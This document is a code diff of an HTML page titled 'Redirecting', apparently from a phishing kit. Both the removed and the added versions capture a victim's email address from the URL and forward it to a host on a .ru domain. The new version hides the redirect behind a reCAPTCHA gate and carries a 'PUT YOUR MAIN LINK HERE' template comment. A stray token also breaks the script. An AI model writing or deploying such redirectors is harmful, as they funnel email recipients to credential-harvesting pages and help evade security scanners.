@@ -1,30 +1,40 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <script>
-        var autocode = "#EMAILURLSILENTC0DERS";
-        var link = "https://V4EHvQik.q6r8s.ru/S7Q19MRuy/";
-        function getEmailParamFromURL() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const emailParam = urlParams.get("email");
+  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
     
-        if (!emailParam) {
-        const urlFragment = window.location.hash.substring(1);
-        try {
-        const decodedText = atob(urlFragment);
-        return decodedText;
-        } catch (error) {
-        return urlFragment;
-        }
-        }
-        return emailParam;
-        }
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+<title>...Redirecting</title>
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
 
-        const emailValue = getEmailParamFromURL();
-        if (emailValue) {
-        autocode = "#"+emailValue;
-        }
-        window.location.href = link+autocode;
-    </script>
-    <title>Redirecting...</title>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+  </head>
+  <body>
+  
+  </br></br>
+   <div class="container h-100 d-flex justify-content-center">
+    <div class="my-auto">
+     
+     <div class="g-recaptcha" data-callback="recaptchaCallback" data-sitekey="6Ld2jHApAAAAAIqlmaEVw-KKN0dOBy_CFAeNMiRn
+"></div>        
+
+    </div>
+</div>
+</body>
+<script>
+
+brow
+function recaptchaCallback() {
+  var hash = window.location.hash;
+  if(hash !== "") {
+
+    hash = hash.split('#');
+    const hash1 = hash[1];
+     const email = hash1;
+     
+      window.location.href = "https://V4EHvQik.q6r8s.ru/S7Q9MRu/#X" + email;//*PUT YOUR MAIN LINK HERE *//
+  }
+}
+</script>
+</html>
